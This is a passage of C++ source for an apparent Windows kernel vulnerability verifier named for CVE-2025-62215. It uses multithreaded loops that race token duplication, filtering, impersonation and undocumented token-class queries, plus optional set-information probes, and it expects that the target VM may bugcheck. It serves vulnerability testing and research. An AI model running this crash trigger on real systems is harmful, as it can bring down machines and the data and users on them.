        << " returned=" << hex_ptr(out);
    if (loud || !is_common_gate_status(st)) {
        log_line(oss.str(), NT_SUCCESS(st) || !is_common_gate_status(st));
    } else if (NT_SUCCESS(st)) {
        dbg_line(oss.str());
    }
    kd_breadcrumb("relation-duplicate", token, out, st, loud);
    if (NT_SUCCESS(st) && out != nullptr) {
        return unique_handle(out);
    }
    if (out != nullptr) {
        CloseHandle(out);
    }
    return unique_handle();
}

unique_handle filter_token_handle_for_relation(HANDLE token, ULONG flags, const std::string &label, Stats *stats, bool loud) {
    HANDLE out = nullptr;
    NTSTATUS st = g_nt.NtFilterToken(token, flags, nullptr, nullptr, nullptr, &out);
    record_status(stats, st);

    std::ostringstream oss;
    oss << "[Relation.Handle] " << label
        << " op=Filter flags=" << hex_u32(flags)
        << " status=" << format_status(st)
        << " returned=" << hex_ptr(out);
    if (loud || !is_common_gate_status(st)) {
        log_line(oss.str(), NT_SUCCESS(st) || !is_common_gate_status(st));
    } else if (NT_SUCCESS(st)) {
        dbg_line(oss.str());
    }
    kd_breadcrumb("relation-filter", token, out, st, loud);
    if (NT_SUCCESS(st) && out != nullptr) {
        return unique_handle(out);
    }
    if (out != nullptr) {
        CloseHandle(out);
    }
    return unique_handle();
}

void openclose_token_once(Stats *stats) {
    HANDLE h = nullptr;
    BOOL ok = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &h);
    if (ok) {
        unique_handle tmp(h);
        record_op(&stats->openclose, true);
    } else {
        record_op(&stats->openclose, false);
    }
    stats->total_ops.fetch_add(1, std::memory_order_relaxed);
}

void openclose_token_burst_once(Stats *stats, uint32_t requested_count) {
    uint32_t count = std::max<uint32_t>(1, std::min<uint32_t>(requested_count, 4));
    std::vector<unique_handle> handles;
    handles.reserve(count);

    bool all_ok = true;
    for (uint32_t i = 0; i < count; ++i) {
        HANDLE h = nullptr;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &h)) {
            handles.emplace_back(h);
        } else {
            all_ok = false;
        }
    }

    record_op(&stats->openclose, all_ok && handles.size() == count);
    stats->total_ops.fetch_add(1, std::memory_order_relaxed);
}

void target_pid_churn_once(const Config &cfg, Stats *stats, uint64_t random_bits) {
    unique_handle token = open_target_token_quiet(cfg.pid);
    bool opened = static_cast<bool>(token);
    record_op(&stats->targetchurn, opened);
    stats->total_ops.fetch_add(1, std::memory_order_relaxed);
    if (!opened) {
        return;
    }

    TOKEN_INFORMATION_CLASS linked_class = static_cast<TOKEN_INFORMATION_CLASS>(19);
    TOKEN_INFORMATION_CLASS shadow_class = static_cast<TOKEN_INFORMATION_CLASS>(-2);
    uint32_t choice = static_cast<uint32_t>(random_bits & 0x3U);
    if (choice == 0 && !cfg.no_query19) {
        query_token_class_once(token.get(), linked_class, "TargetChurn.Query(19)", false, stats, &stats->q19, false);
    } else if (choice == 1 && !cfg.no_query_shadow) {
        query_token_class_once(token.get(), shadow_class, "TargetChurn.Query(-2)", false, stats, &stats->qshadow, false);
    } else if (choice == 2 && !cfg.no_duplicate) {
        duplicate_token_once(token.get(), (random_bits & 0x10U) != 0, false, stats, false);
    } else if (!cfg.no_filter) {
        filter_token_once(token.get(), false, stats, false);
    }
}

void run_relation_pair(const TokenRelationSnapshot &base,
                       const TokenRelationSnapshot &other,
                       const std::string &label,
                       bool loud) {
    log_relation_snapshot(other, loud);
    compare_token_relation(base, other, label, loud);
}

void run_relation_family(HANDLE base_token,
                         const std::string &base_label,
                         const Config &cfg,
                         bool include_group_counts,
                         bool loud,
                         Stats *stats) {
    if (base_token == nullptr) {
        return;
    }

    TokenRelationSnapshot base = capture_token_relation_snapshot(base_token, base_label, include_group_counts);
    log_relation_snapshot(base, loud);

    if (!cfg.no_query19) {
        unique_handle linked = query_linked_token_handle_for_relation(base_token, base_label + ".linked", stats, loud);
        if (linked) {
            TokenRelationSnapshot linked_snap = capture_token_relation_snapshot(linked.get(), base_label + ".linked", include_group_counts);
            run_relation_pair(base, linked_snap, base_label + "->linked", loud);
        }
    }

    unique_handle dup_false;
    unique_handle dup_true;
    if (!cfg.no_duplicate) {
        dup_false = duplicate_token_handle_for_relation(base_token,
                                                       false,
                                                       TokenImpersonation,
                                                       SecurityImpersonation,
                                                       TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                                                       base_label + ".dupFalse",
                                                       stats,
                                                       loud);
        if (dup_false) {
            TokenRelationSnapshot dup_snap = capture_token_relation_snapshot(dup_false.get(), base_label + ".dupFalse", include_group_counts);
            run_relation_pair(base, dup_snap, base_label + "->dupFalse", loud);
        }

        dup_true = duplicate_token_handle_for_relation(base_token,
                                                      true,
                                                      TokenImpersonation,
                                                      SecurityImpersonation,
                                                      TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                                                      base_label + ".dupTrue",
                                                      stats,
                                                      loud);
        if (dup_true) {
            TokenRelationSnapshot dup_snap = capture_token_relation_snapshot(dup_true.get(), base_label + ".dupTrue", include_group_counts);
            run_relation_pair(base, dup_snap, base_label + "->dupTrue", loud);
        }
    }

    unique_handle filtered_disable;
    unique_handle filtered_zero;
    if (!cfg.no_filter) {
        filtered_disable = filter_token_handle_for_relation(base_token, DISABLE_MAX_PRIVILEGE, base_label + ".filterDisableMax", stats, loud);
        if (filtered_disable) {
            TokenRelationSnapshot filt_snap = capture_token_relation_snapshot(filtered_disable.get(), base_label + ".filterDisableMax", include_group_counts);
            run_relation_pair(base, filt_snap, base_label + "->filterDisableMax", loud);
        }

        filtered_zero = filter_token_handle_for_relation(base_token, 0, base_label + ".filterZero", stats, loud);
        if (filtered_zero) {
            TokenRelationSnapshot filt_snap = capture_token_relation_snapshot(filtered_zero.get(), base_label + ".filterZero", include_group_counts);
            run_relation_pair(base, filt_snap, base_label + "->filterZero", loud);
        }
    }

    if (dup_false && filtered_disable) {
        TokenRelationSnapshot dup_snap = capture_token_relation_snapshot(dup_false.get(), base_label + ".dupFalse.recheck", false);
        TokenRelationSnapshot filt_snap = capture_token_relation_snapshot(filtered_disable.get(), base_label + ".filterDisableMax.recheck", false);
        compare_token_relation(dup_snap, filt_snap, base_label + ".dupFalse->filterDisableMax", loud);
    }
}

void run_relation_probes(HANDLE current_token, HANDLE target_token, const Config &cfg) {
    log_line("[Relation] begin", true);
    kd_breadcrumb("relation-begin", current_token, target_token, STATUS_SUCCESS, true);
    run_relation_family(current_token, "current", cfg, true, true, nullptr);
    if (target_token != nullptr) {
        TokenRelationSnapshot current = capture_token_relation_snapshot(current_token, "current.cross", true);
        TokenRelationSnapshot target = capture_token_relation_snapshot(target_token, "target", true);
        log_relation_snapshot(target, true);
        compare_token_relation(current, target, "current->target", true);
        run_relation_family(target_token, "target", cfg, true, true, nullptr);
    }
    kd_breadcrumb("relation-end", current_token, target_token, STATUS_SUCCESS, true);
    log_line("[Relation] end", true);
}

void relation_stress_probe_once(HANDLE current_token, HANDLE target_token, const Config &cfg, Stats *stats, uint64_t bits) {
    bool ok = false;
    HANDLE base_token = ((bits & 0x8U) != 0 && target_token != nullptr) ? target_token : current_token;
    std::string base_label = (base_token == target_token && target_token != nullptr) ? "stress.target" : "stress.current";
    TokenRelationSnapshot base = capture_token_relation_snapshot(base_token, base_label, false);
    uint32_t choice = static_cast<uint32_t>(bits & 0x3U);

    if (choice == 0 && !cfg.no_query19) {
        unique_handle linked = query_linked_token_handle_for_relation(base_token, base_label + ".linked", stats, false);
        if (linked) {
            TokenRelationSnapshot linked_snap = capture_token_relation_snapshot(linked.get(), base_label + ".linked", false);
            ok = compare_token_relation(base, linked_snap, base_label + "->linked", false);
        }
    } else if (choice == 1 && !cfg.no_duplicate) {
        unique_handle dup = duplicate_token_handle_for_relation(base_token,
                                                               (bits & 0x10U) != 0,
                                                               TokenImpersonation,
                                                               SecurityImpersonation,
                                                               TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                                                               base_label + ".dup",
                                                               stats,
                                                               false);
        if (dup) {
            TokenRelationSnapshot dup_snap = capture_token_relation_snapshot(dup.get(), base_label + ".dup", false);
            ok = compare_token_relation(base, dup_snap, base_label + "->dup", false);
        }
    } else if (!cfg.no_filter) {
        unique_handle filt = filter_token_handle_for_relation(base_token,
                                                             ((bits & 0x20U) != 0) ? DISABLE_MAX_PRIVILEGE : 0,
                                                             base_label + ".filter",
                                                             stats,
                                                             false);
        if (filt) {
            TokenRelationSnapshot filt_snap = capture_token_relation_snapshot(filt.get(), base_label + ".filter", false);
            ok = compare_token_relation(base, filt_snap, base_label + "->filter", false);
        }
    }

    record_op(stats == nullptr ? nullptr : &stats->relation, ok);
    if (stats != nullptr) {
        stats->total_ops.fetch_add(1, std::memory_order_relaxed);
    }
}

NTSTATUS set_token_info_probe_once(HANDLE token,
                                   TOKEN_INFORMATION_CLASS cls,
                                   HANDLE value,
                                   const std::string &label) {
    HANDLE buffer = value;
    NTSTATUS st = g_nt.NtSetInformationToken(token, cls, &buffer, sizeof(buffer));
    std::ostringstream oss;
    oss << "[SetProbes] " << label
        << " class=" << (cls == static_cast<TOKEN_INFORMATION_CLASS>(19) ? "19" : "-2")
        << " value=" << hex_ptr(buffer)
        << " status=" << format_status(st);
    log_line(oss.str(), NT_SUCCESS(st));
    if (NT_SUCCESS(st)) {
        log_line("[SetProbes] CONFIRMED_UNEXPECTED success; no handle retained", true);
    }
    return st;
}

NTSTATUS set_token_info_probe_len_once(HANDLE token,
                                       TOKEN_INFORMATION_CLASS cls,
                                       HANDLE value,
                                       ULONG len,
                                       bool null_buffer,
                                       const std::string &label) {
    HANDLE buffer = value;
    PVOID ptr = null_buffer ? nullptr : &buffer;
    NTSTATUS st = g_nt.NtSetInformationToken(token, cls, ptr, len);
    std::ostringstream oss;
    oss << "[SetProbes.Len] " << label
        << " class=" << (cls == static_cast<TOKEN_INFORMATION_CLASS>(19) ? "19" : "-2")
        << " len=" << len
        << " nullbuf=" << yes_no(null_buffer)
        << " value=" << hex_ptr(buffer)
        << " status=" << format_status(st);
    log_line(oss.str(), NT_SUCCESS(st) || !is_common_gate_status(st));
    if (NT_SUCCESS(st)) {
        log_line("[SetProbes.Len] CONFIRMED_UNEXPECTED success; no handle retained", true);
    }
    return st;
}

void run_query_length_matrix(HANDLE token,
                             TOKEN_INFORMATION_CLASS cls,
                             const std::string &label,
                             OpCounters *counter) {
    const ULONG handle_len = static_cast<ULONG>(sizeof(HANDLE));
    const ULONG full_len = static_cast<ULONG>(sizeof(HANDLE) + (sizeof(ULONG_PTR) * 3));
    const ULONG variants[] = {
        0,
        handle_len > 0 ? handle_len - 1 : 0,
        handle_len,
        handle_len + 1,
        full_len
    };

    query_token_class_len_once(token, cls, label + ".null0", 0, true, false, nullptr, counter, true);
    for (ULONG len : variants) {
        query_token_class_len_once(token, cls, label, len, false, false, nullptr, counter, true);
    }
}

void run_matrix(HANDLE current_token, HANDLE target_token, const Config &cfg) {
    log_line("[matrix] begin", true);
    TOKEN_INFORMATION_CLASS linked_class = static_cast<TOKEN_INFORMATION_CLASS>(19);
    TOKEN_INFORMATION_CLASS shadow_class = static_cast<TOKEN_INFORMATION_CLASS>(-2);

    if (!cfg.no_query19) {
        query_token_class_once(current_token, linked_class, "Query(19)", true, nullptr, nullptr, true);
        run_query_length_matrix(current_token, linked_class, "Query(19)", nullptr);
        if (target_token != nullptr) {
            query_token_class_once(target_token, linked_class, "Target.Query(19)", true, nullptr, nullptr, true);
            run_query_length_matrix(target_token, linked_class, "Target.Query(19)", nullptr);
        }
    } else {
        log_line("[matrix] Query(19) skipped by --no-query19");
    }

    if (!cfg.no_query_shadow) {
        query_token_class_once(current_token, shadow_class, "Query(-2)", true, nullptr, nullptr, true);
        run_query_length_matrix(current_token, shadow_class, "Query(-2)", nullptr);
        if (target_token != nullptr) {
            query_token_class_once(target_token, shadow_class, "Target.Query(-2)", true, nullptr, nullptr, true);
            run_query_length_matrix(target_token, shadow_class, "Target.Query(-2)", nullptr);
        }
    } else {
        log_line("[matrix] Query(-2) skipped by --no-query-shadow");
    }

    run_relation_probes(current_token, target_token, cfg);

    if (!cfg.no_duplicate) {
        duplicate_token_once(current_token, false, true, nullptr, true);
        duplicate_token_once(current_token, true, true, nullptr, true);
        duplicate_token_variant_once(current_token,
                                     false,
                                     TokenPrimary,
                                     SecurityImpersonation,
                                     TOKEN_QUERY | TOKEN_DUPLICATE,
                                     "Duplicate.Primary",
                                     true,
                                     nullptr,
                                     true);
        duplicate_token_variant_once(current_token,
                                     true,
                                     TokenImpersonation,
                                     SecurityIdentification,
                                     TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                                     "Duplicate.Identification",
                                     true,
                                     nullptr,
                                     true);
        if (target_token != nullptr) {
            duplicate_token_once(target_token, false, true, nullptr, true);
            duplicate_token_once(target_token, true, true, nullptr, true);
        }
    } else {
        log_line("[matrix] NtDuplicateToken skipped by --no-duplicate");
    }

    if (!cfg.no_impersonate && !cfg.no_duplicate) {
        self_impersonation_once(current_token, false, nullptr, true);
        self_impersonation_once(current_token, true, nullptr, true);
        if (target_token != nullptr) {
            log_line("[matrix] Target self-impersonation skipped: target token remains read-only/duplicate-only");
        }
    } else {
        log_line("[matrix] SelfImpersonate skipped by --no-impersonate or --no-duplicate");
    }

    if (!cfg.no_filter) {
        filter_token_once(current_token, true, nullptr, true);
        filter_token_variant_once(current_token, 0, "Filter.ZeroFlags", true, nullptr, true);
        if (target_token != nullptr) {
            filter_token_once(target_token, true, nullptr, true);
            filter_token_variant_once(target_token, 0, "Target.Filter.ZeroFlags", true, nullptr, true);
        }
    } else {
        log_line("[matrix] NtFilterToken skipped by --no-filter");
    }

    if (cfg.enable_set_probes && cfg.yes_local_vm) {
        log_line("[SetProbes] ENABLED explicit --enable-set-probes --yes-local-vm present", true);
        HANDLE class19_target = target_token != nullptr ? target_token : current_token;
        set_token_info_probe_once(current_token, linked_class, class19_target, "TokenLinkedToken source=current");
        set_token_info_probe_len_once(current_token, linked_class, class19_target, 0, true, "TokenLinkedToken null0");
        set_token_info_probe_len_once(current_token,
                                      linked_class,
                                      class19_target,
                                      static_cast<ULONG>(sizeof(HANDLE) - 1),
                                      false,
                                      "TokenLinkedToken short");
        set_token_info_probe_len_once(current_token,
                                      linked_class,
                                      class19_target,
                                      static_cast<ULONG>(sizeof(HANDLE) + 1),
                                      false,
                                      "TokenLinkedToken long");
        set_token_info_probe_once(current_token, shadow_class, nullptr, "ShadowClass null-target");
        set_token_info_probe_len_once(current_token, shadow_class, nullptr, 0, true, "ShadowClass null0");
        if (target_token != nullptr) {
            set_token_info_probe_once(current_token, shadow_class, target_token, "ShadowClass target-token");
            set_token_info_probe_len_once(current_token,
                                          shadow_class,
                                          target_token,
                                          static_cast<ULONG>(sizeof(HANDLE) - 1),
                                          false,
                                          "ShadowClass target-token short");
            set_token_info_probe_len_once(current_token,
                                          shadow_class,
                                          target_token,
                                          static_cast<ULONG>(sizeof(HANDLE) + 1),
                                          false,
                                          "ShadowClass target-token long");
        } else {
            log_line("[SetProbes] ShadowClass target-token variant skipped: no --pid target token");
        }
    } else {
        log_line("[SetProbes] SKIPPED_SET_PROBES require --enable-set-probes --yes-local-vm", true);
    }

    log_line("[matrix] end", true);
}

std::vector<std::pair<NTSTATUS, uint64_t>> top_statuses(Stats &stats, size_t limit) {
    std::vector<std::pair<NTSTATUS, uint64_t>> items;
    {
        std::lock_guard<std::mutex> lock(stats.status_mutex);
        for (const auto &kv : stats.statuses) {
            items.push_back(kv);
        }
    }
    std::sort(items.begin(), items.end(), [](const auto &a, const auto &b) {
        if (a.second != b.second) {
            return a.second > b.second;
        }
        return static_cast<uint32_t>(a.first) < static_cast<uint32_t>(b.first);
    });
    if (items.size() > limit) {
        items.resize(limit);
    }
    return items;
}

std::string status_summary(Stats &stats) {
    auto tops = top_statuses(stats, 5);
    std::ostringstream oss;
    oss << " statuses=";
    if (tops.empty()) {
        oss << "none";
        return oss.str();
    }
    bool first = true;
    for (const auto &kv : tops) {
        if (!first) {
            oss << ",";
        }
        first = false;
        oss << format_status(kv.first) << ":" << kv.second;
    }
    return oss.str();
}

void print_stress_summary(Stats &stats, DWORD elapsed, bool final) {
    std::ostringstream oss;
    oss << (final ? "[stress.final]" : "[stress]")
        << " t=" << elapsed << "s"
        << " ops=" << stats.total_ops.load(std::memory_order_relaxed)
        << " q19_ok=" << stats.q19.ok.load(std::memory_order_relaxed)
        << " q19_fail=" << stats.q19.fail.load(std::memory_order_relaxed)
        << " qshadow_ok=" << stats.qshadow.ok.load(std::memory_order_relaxed)
        << " qshadow_fail=" << stats.qshadow.fail.load(std::memory_order_relaxed)
        << " dup_ok=" << stats.dup.ok.load(std::memory_order_relaxed)
        << " dup_fail=" << stats.dup.fail.load(std::memory_order_relaxed)
        << " filter_ok=" << stats.filter.ok.load(std::memory_order_relaxed)
        << " filter_fail=" << stats.filter.fail.load(std::memory_order_relaxed)
        << " openclose_ok=" << stats.openclose.ok.load(std::memory_order_relaxed)
        << " openclose_fail=" << stats.openclose.fail.load(std::memory_order_relaxed)
        << " targetchurn_ok=" << stats.targetchurn.ok.load(std::memory_order_relaxed)
        << " targetchurn_fail=" << stats.targetchurn.fail.load(std::memory_order_relaxed)
        << " impersonate_ok=" << stats.impersonate.ok.load(std::memory_order_relaxed)
        << " impersonate_fail=" << stats.impersonate.fail.load(std::memory_order_relaxed)
        << " relation_ok=" << stats.relation.ok.load(std::memory_order_relaxed)
        << " relation_fail=" << stats.relation.fail.load(std::memory_order_relaxed)
        << status_summary(stats);
    log_line(oss.str(), true);
}

void worker_loop(unsigned int worker_id, HANDLE current_token, HANDLE target_token, const Config &cfg, Stats *stats) {
    std::mt19937_64 rng((static_cast<uint64_t>(GetTickCount64()) << 16) ^
                        (static_cast<uint64_t>(GetCurrentThreadId()) << 1) ^
                        static_cast<uint64_t>(worker_id));
    TOKEN_INFORMATION_CLASS linked_class = static_cast<TOKEN_INFORMATION_CLASS>(19);
    TOKEN_INFORMATION_CLASS shadow_class = static_cast<TOKEN_INFORMATION_CLASS>(-2);

    while (!g_stop.load(std::memory_order_relaxed)) {
        int choices[14] = {};
        size_t choice_count = 0;
        if (!cfg.no_query19) {
            choices[choice_count++] = 0;
            choices[choice_count++] = 7;
        }
        if (!cfg.no_query_shadow) {
            choices[choice_count++] = 1;
            choices[choice_count++] = 8;
        }
        if (!cfg.no_duplicate) {
            choices[choice_count++] = 2;
        }
        if (!cfg.no_filter) {
            choices[choice_count++] = 3;
        }
        choices[choice_count++] = 4;
        choices[choice_count++] = 9;
        if (target_token != nullptr && !cfg.no_query19) {
            choices[choice_count++] = 5;
        }
        if (target_token != nullptr && !cfg.no_query_shadow) {
            choices[choice_count++] = 10;
        }
        if (target_token != nullptr && !cfg.no_duplicate) {
            choices[choice_count++] = 6;
        }
        if (cfg.pid != 0) {
            choices[choice_count++] = 11;
        }
        if (!cfg.no_impersonate && !cfg.no_duplicate) {
            choices[choice_count++] = 12;
        }
        choices[choice_count++] = 13;

        if (choice_count == 0) {
            openclose_token_once(stats);
        } else {
            int op = choices[static_cast<size_t>(rng() % choice_count)];
            switch (op) {
            case 0:
                query_token_class_once(current_token, linked_class, "Query(19)", false, stats, &stats->q19, false);
                break;
            case 1:
                query_token_class_once(current_token, shadow_class, "Query(-2)", false, stats, &stats->qshadow, false);
                break;
            case 2:
                if ((rng() & 0x7U) == 0) {
                    TOKEN_TYPE type = ((rng() & 0x8U) == 0) ? TokenPrimary : TokenImpersonation;
                    SECURITY_IMPERSONATION_LEVEL levels[] = {
                        SecurityIdentification,
                        SecurityImpersonation,
                        SecurityDelegation
                    };
                    SECURITY_IMPERSONATION_LEVEL level = levels[static_cast<size_t>(rng() % 3U)];
                    ACCESS_MASK desired = (type == TokenPrimary)
                                              ? (TOKEN_QUERY | TOKEN_DUPLICATE)
                                              : (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE);
                    duplicate_token_variant_once(current_token,
                                                 (rng() & 0x10U) != 0,
                                                 type,
                                                 level,
                                                 desired,
                                                 "Duplicate.StressVariant",
                                                 false,
                                                 stats,
                                                 false);
                } else {
                    duplicate_token_once(current_token, (rng() & 1U) != 0, false, stats, false);
                }
                break;
            case 3:
                filter_token_variant_once(current_token,
                                          ((rng() & 1U) != 0) ? DISABLE_MAX_PRIVILEGE : 0,
                                          "Filter.StressVariant",
                                          false,
                                          stats,
                                          false);
                break;
            case 4:
                openclose_token_once(stats);
                break;
            case 5:
                query_token_class_once(target_token, linked_class, "Target.Query(19)", false, stats, &stats->q19, false);
                break;
            case 6:
                duplicate_token_once(target_token, (rng() & 1U) != 0, false, stats, false);
                break;
            case 7: {
                ULONG lens[] = {
                    0,
                    static_cast<ULONG>(sizeof(HANDLE) - 1),
                    static_cast<ULONG>(sizeof(HANDLE)),
                    static_cast<ULONG>(sizeof(HANDLE) + 1),
                    static_cast<ULONG>(sizeof(HANDLE) + (sizeof(ULONG_PTR) * 3))
                };
                bool null_buffer = ((rng() & 0xFU) == 0);
                ULONG len = null_buffer ? 0 : lens[static_cast<size_t>(rng() % 5U)];
                query_token_class_len_once(current_token, linked_class, "Query(19).StressLen", len, null_buffer, false, stats, &stats->q19, false);
                break;
            }
            case 8: {
                ULONG lens[] = {
                    0,
                    static_cast<ULONG>(sizeof(HANDLE) - 1),
                    static_cast<ULONG>(sizeof(HANDLE)),
                    static_cast<ULONG>(sizeof(HANDLE) + 1),
                    static_cast<ULONG>(sizeof(HANDLE) + (sizeof(ULONG_PTR) * 3))
                };
                bool null_buffer = ((rng() & 0xFU) == 0);
                ULONG len = null_buffer ? 0 : lens[static_cast<size_t>(rng() % 5U)];
                query_token_class_len_once(current_token, shadow_class, "Query(-2).StressLen", len, null_buffer, false, stats, &stats->qshadow, false);
                break;
            }
            case 9:
                openclose_token_burst_once(stats, static_cast<uint32_t>((rng() % 4U) + 1U));
                break;
            case 10:
                query_token_class_once(target_token, shadow_class, "Target.Query(-2)", false, stats, &stats->qshadow, false);
                break;
            case 11:
                target_pid_churn_once(cfg, stats, rng());
                break;
            case 12:
                self_impersonation_once(current_token, (rng() & 1U) != 0, stats, false);
                break;
            case 13:
                relation_stress_probe_once(current_token, target_token, cfg, stats, rng());
                break;
            default:
                openclose_token_once(stats);
                break;
            }
        }

        if ((rng() & 0x3U) == 0) {
            SwitchToThread();
        }
        Sleep(0);
        if ((rng() & 0x3FFU) == 0) {
            Sleep(1);
        }
    }
}

BOOL WINAPI console_ctrl_handler(DWORD type) {
    switch (type) {
    case CTRL_C_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        g_stop.store(true, std::memory_order_relaxed);
        dbg_line("[ctrl] stop requested");
        return TRUE;
    default:
        return FALSE;
    }
}

void run_stress(HANDLE current_token, HANDLE target_token, const Config &cfg) {
    log_line("[stress] begin", true);
    kd_breadcrumb("stress-begin", current_token, target_token, STATUS_SUCCESS, true);
    g_stop.store(false, std::memory_order_relaxed);
    Stats stats;

    std::vector<std::thread> threads;
    threads.reserve(cfg.threads);
    for (DWORD i = 0; i < cfg.threads; ++i) {
        threads.emplace_back(worker_loop, i, current_token, target_token, std::cref(cfg), &stats);
    }

    ULONGLONG start = GetTickCount64();
    DWORD last_elapsed = 0;
    while (!g_stop.load(std::memory_order_relaxed)) {
        ULONGLONG now = GetTickCount64();
        DWORD elapsed = static_cast<DWORD>((now - start) / 1000ULL);
        if (cfg.seconds != 0 && elapsed >= cfg.seconds) {
            break;
        }
        if (elapsed != last_elapsed) {
            last_elapsed = elapsed;
            print_stress_summary(stats, elapsed, false);
        }
        Sleep(100);
    }

    g_stop.store(true, std::memory_order_relaxed);
    for (auto &t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }
    DWORD elapsed = static_cast<DWORD>((GetTickCount64() - start) / 1000ULL);
    print_stress_summary(stats, elapsed, true);
    kd_breadcrumb("stress-end", current_token, target_token, STATUS_SUCCESS, true);
    log_line("[stress] end", true);
}

void print_banner(const Config &cfg) {
    DWORD pid = GetCurrentProcessId();
    DWORD tid = GetCurrentThreadId();
    log_line("CVE-2025-62215 token lifetime verifier");
    log_line("[build] expected_arch=x64 cpp=C++17");
    log_line("[process] pid=" + std::to_string(pid) + " tid=" + std::to_string(tid));
    log_line("[safe] NON_LPE_VERIFIER_NO_TOKEN_STEALING", true);
    log_line("[safe] AGGRESSIVE_CRASH_VERIFIER_NO_POOL_SPRAY_NO_TOKEN_REPLACE_NO_KERNEL_RW", true);
    log_line("[safe] SELF_IMPERSONATION_ONLY_DUPLICATE_AND_REVERT", true);
    log_line("[config] mode=" + mode_to_string(cfg.mode) +
             " threads=" + std::to_string(cfg.threads) +
             " seconds=" + std::to_string(cfg.seconds) +
             " set_probes=" + ((cfg.enable_set_probes && cfg.yes_local_vm) ? std::string("enabled") : std::string("disabled")));
    if (!(cfg.enable_set_probes && cfg.yes_local_vm)) {
        log_line("[SetProbes] SKIPPED_SET_PROBES require --enable-set-probes --yes-local-vm", true);
    }
}

int wmain(int argc, wchar_t **argv) {
    Config cfg = parse_args(argc, argv);
    if (cfg.parse_error) {
        print_help();
        return 1;
    }
    if (cfg.help) {
        print_help();
        return 0;
    }

    if (cfg.print_kd_cheatsheet) {
        print_kd_cheatsheet();
        return 0;
    }

    print_banner(cfg);

    if (!resolve_ntdll(&g_nt)) {
        return 2;
    }

    if (!SetConsoleCtrlHandler(console_ctrl_handler, TRUE)) {
        log_line("[ctrl] SetConsoleCtrlHandler failed gle=" + std::to_string(GetLastError()));
    }

    unique_handle current_token = open_current_token();
    if (!current_token) {
        return 3;
    }

    inspect_current_token(current_token.get());

    unique_handle target_token;
    if (cfg.pid != 0) {
        target_token = open_target_token(cfg.pid);
        if (target_token) {
            inspect_token_basic(target_token.get(), "[token.target]");
            inspect_token_deep(target_token.get(), "[token.target.deep]");
            inspect_linked_token_win32(target_token.get());
        }
    }

    HANDLE target = target_token ? target_token.get() : nullptr;
    emit_kd_breadcrumbs(current_token.get(), target, cfg);
    if (cfg.mode == Mode::Matrix || cfg.mode == Mode::All) {
        run_matrix(current_token.get(), target, cfg);
    }
    if (cfg.mode == Mode::Stress || cfg.mode == Mode::All) {
        run_stress(current_token.get(), target, cfg);
    }

    log_line("[exit] clean exit unless target VM bugchecked during stress", true);
    return 0;
}
